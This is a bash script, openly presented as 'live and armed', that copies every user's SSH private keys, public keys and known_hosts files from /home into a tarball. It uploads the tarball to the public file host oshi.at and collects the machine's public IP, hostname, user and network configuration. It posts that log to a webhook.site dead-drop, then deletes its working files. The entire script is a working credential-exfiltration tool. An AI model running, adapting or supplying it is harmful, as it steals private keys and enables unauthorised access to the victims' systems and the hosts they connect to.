#!/usr/bin/env bash
#	Keeping it portable.
#	see:	https://www.cyberciti.biz/tips/finding-bash-perl-python-portably-using-env.html



###	FAIR WARNING!
##	THIS SCRIPT IS LIVE AND ARMED!
#	DO NOT USE ON PRODUCTION SYSTEMS!!
##	THIS SCRIPT NEEDS TO BE ADAPTED AT LINE 96!
#	OTHERWISE IT WILL BREAK!



##	Preparation

mkdir ./ssh-exfil
#	creating a working directory



##		collecting the ssh keys, pubkeys and known-hosts

	rsync -a --prune-empty-dirs --include '*/' --include 'id_*' --include 'known_hosts' --exclude '*' /home ./ssh-exfil
#		find all ssh-keys, ssh-pubkeys and known-hosts files for users and copy them into the subfolder ./ssh-exfil
#		see also:	https://unix.stackexchange.com/questions/83593/copy-specific-file-type-keeping-the-folder-structure/83596#83596



##		basic cleanup

	for i in $(find . -name ".ssh" -type d)
		do
			cd $i
			cd ./..
			mv .ssh ssh
			cd ./..
			cd ./..
	done
#	rename all extracted ".ssh" subfolders into "ssh" so that they ain't hidden anymore
#	see :	https://stackoverflow.com/a/31478604
#			https://securitronlinux.com/debian-testing/renaming-folders-with-a-loop-in-bash-is-easy/
#			https://linuxize.com/post/how-to-rename-directories-in-linux/



##	getting ready to exfiltrate

tar cfv ssh-exfil.tar ./ssh-exfil/
#	pack the exfiltrated data into a tarball

rm -rf ./ssh-exfil
#	remove the working directory



##	exfiltrate the file

touch ./work.log
#   creating logfile
#	see:	https://unix.stackexchange.com/questions/61931/redirect-all-subsequent-commands-stderr-using-exec/61932#61932
{
	curl https://oshi.at -F f=@./ssh-exfil.tar
#		Transfers file to oshi.at using curl POST
#			This could also be done with any other service
#		see :	https://oshi.at/cmd
#				https://github.com/somenonymous/OshiUpload

	curl ipinfo.io/ip
#		determining public IP adress
#		see:	https://stackoverflow.com/questions/14594151/methods-to-detect-public-ip-address-in-bash#14594304

	echo ""
#		inserting a linke break
	

	fqn=$(host -TtA $(hostname -s)|grep "has address"|awk '{print $1}') ; \
	if [[ "${fqn}" == "" ]] ; then fqn=$(hostname -s) ; fi ; \
	echo "${fqn}"
#		Find the FQDN of the machine.
#		see:	https://serverfault.com/questions/367141/how-to-get-the-fully-qualified-name-fqn-on-unix-in-a-bash-script/367682#367682

	whoami
#		Find the current user running it.

	ip link && ip neigh && ip route && ip rule && ip maddress && ip address
#		Collecting further network info

} 2>&1 | tee -a ./work.log
#	closing the log and saving it



##	Dead-drop the upload and related info on a server
#	See:	https://en.wikipedia.org/wiki/Dead_drop#Modern_techniques
#			https://en.wikipedia.org/wiki/Foldering

#	this upload will be < 1kB in size, so it's perfectly fine with a lot of free API testing tools.
curl https://webhook.site/REDACTED-TO-BE-PERSONALIZED -F f=@./work.log
#	This will submit the link of the uploaded file as HTTP POST request to webhook.site
#	See:	https://webhook.site/
#			https://linux.die.net/man/1/curl
#			curl manpages

#	Another option would be to use wsend:
#	See:	https://github.com/abemassry/wsend/issues/21#issuecomment-1048395716
#	Tho I'd seriously disrecommend it for said purpose.


##	cleanup
#	removing all remaining files
rm ./ssh-exfil.tar
rm ./work.log

#	closing script
exit